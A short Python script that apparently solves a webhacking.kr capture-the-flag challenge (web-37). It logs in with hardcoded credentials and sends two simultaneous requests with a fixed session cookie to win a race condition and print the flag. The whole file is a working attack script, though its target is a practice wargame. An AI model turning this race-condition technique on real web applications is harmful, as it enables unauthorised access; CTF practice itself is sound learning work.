from multiprocessing import Process
import requests

req = requests.Session()
URL_login = "https://webhacking.kr/login.php?login"
URL = "https://webhacking.kr/challenge/web-37/"


re1 = req.post(URL_login, json={"id":"xon1l", "pw":"123456"})


def work(payload):
  headers = {"cookie": "PHPSESSID=63095"}
  re2 = req.get(URL+payload, headers=headers)
  if "FLAG" in re2.text:
    print(re2.text)
    exit(1)
    

pr1 = Process(target=work, args=("",))
pr2 = Process(target=work, args=("?mode=auth",))
pr1.start()
pr2.start()
pr1.join()
pr2.join()
